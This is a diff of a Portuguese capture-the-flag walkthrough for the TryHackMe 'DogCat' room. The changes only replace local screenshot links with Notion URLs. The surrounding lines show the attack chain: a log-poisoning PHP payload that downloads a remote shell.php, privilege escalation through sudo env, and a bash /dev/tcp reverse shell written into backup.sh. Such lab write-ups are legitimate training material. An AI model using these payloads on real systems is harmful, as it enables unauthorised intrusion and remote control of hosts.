@@ -129,13 +129,13 @@ E utilizando o BurpSuite, altero o **UserAgent** da requisição do Access.log p
 
 `<?php file_put_contents('shell.php',file_get_contents('http://[IP]/shell.php'))?>`
 
-![Captura de tela de 2023-06-29 20-17-40.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-17-40.png)
+![Captura de tela de 2023-06-29 20-17-40.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F100ef9b7-ceb1-496e-899f-e4448eaa7776%2FCaptura_de_tela_de_2023-06-29_20-17-40.png?table=block&id=319611d5-d525-4ed1-85d0-0a5ee4619467&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1890&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 ---
 
 Nesse momento nosso serviço Web confirma o acesso ao arquivo.
 
-![Captura de tela de 2023-06-29 20-38-22.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-38-22.png)
+![Captura de tela de 2023-06-29 20-38-22.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8f601904-40e6-474e-9aef-7201b44fbed1%2FCaptura_de_tela_de_2023-06-29_20-38-22.png?table=block&id=885bf728-3760-40b5-91e0-442faf2120cf&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1890&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 Agora é só obter a Shell Reversa com o host. Podemos fazer isso usando o NetCat: 
 
@@ -143,23 +143,23 @@ Agora é só obter a Shell Reversa com o host. Podemos fazer isso usando o NetCa
 
 E pronto! Temos acesso ao Host com sucesso!
 
-![Captura de tela de 2023-06-29 20-40-28.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-40-28.png)
+![Captura de tela de 2023-06-29 20-40-28.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feb69d902-d78d-4ea0-889b-f448fb08e05d%2FCaptura_de_tela_de_2023-06-29_20-40-28.png?table=block&id=d67d071b-2d11-40ab-a990-69b9eb01abdd&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1890&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 Utilizando o comando `find / -name **flag** 2>/dev/null` , podemos começar a encontrar as Flags.
 
-![Captura de tela de 2023-06-29 20-47-12.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-47-12.png)
+![Captura de tela de 2023-06-29 20-47-12.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd424e399-02a7-4e97-8d13-bfd36a56b417%2FCaptura_de_tela_de_2023-06-29_20-47-12.png?table=block&id=47e20a8e-f905-48b7-8e4a-02937acbe49e&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1890&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 Ok, agora vamos ver o que nosso usuário pode executar …
 
-![Captura de tela de 2023-06-29 20-50-26.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-50-26.png)
+![Captura de tela de 2023-06-29 20-50-26.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff5edddd2-0216-4796-b6bd-72e9b72ccf23%2FCaptura_de_tela_de_2023-06-29_20-50-26.png?table=block&id=bb743f5b-c90f-430d-adb3-18731f88377f&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1890&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 Ótimo! podemos executar o env como superusuario sem a necessidade de senha. Para facilitar, podemos acessar o GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) para pesquisar os comandos.
 
-![Captura de tela de 2023-06-29 20-52-39.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-52-39.png)
+![Captura de tela de 2023-06-29 20-52-39.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd37d3efc-6af6-4f42-b577-6615693b5889%2FCaptura_de_tela_de_2023-06-29_20-52-39.png?table=block&id=7e611fd4-7343-43d2-926b-10fd0ff16d60&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1690&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 ---
 
-![Captura de tela de 2023-06-29 20-53-37.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-53-37.png)
+![Captura de tela de 2023-06-29 20-53-37.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F646945d4-91f1-4f53-86fb-0b1fce9bba3e%2FCaptura_de_tela_de_2023-06-29_20-53-37.png?table=block&id=ee2869b6-f2f8-40b3-ad48-f87c0327b241&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1010&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 Finalmente! Como ROOT tudo fica mais fácil. Agora podemos terminar nossa ROOM encontrando as FLAGS restantes usando o mesmo comando que antes (`find / -name **flag** 2>/dev/null`), só que agora como ROOT.
 
@@ -173,7 +173,7 @@ Pelo que entendi esse é um container Docker. E pela última modificação do ar
 
 `echo -e "#!/bin/bash\nbash -i >& /dev/tcp/10.13.5.224/5555 0>&1" > backup.sh`
 
-![Captura de tela de 2023-06-29 21-25-30.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_21-25-30.png)
+![Captura de tela de 2023-06-29 21-25-30.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb6f447d8-5b17-4fa5-8ed0-bdd5febcdc4a%2FCaptura_de_tela_de_2023-06-29_21-25-30.png?table=block&id=77d6100e-ac66-4b0f-b338-ff6607359d47&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1510&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 ---
 
@@ -181,7 +181,7 @@ E por fim a Flag4 !
 
 ---
 
-![Captura de tela de 2023-06-29 21-26-07.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_21-26-07.png)
+![Captura de tela de 2023-06-29 21-26-07.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0be82a9a-1f38-461a-a567-59dabce4f88b%2FCaptura_de_tela_de_2023-06-29_21-26-07.png?table=block&id=5f4797aa-0aa0-4b46-8519-acd29791ffec&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1510&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)
 
 ---
 
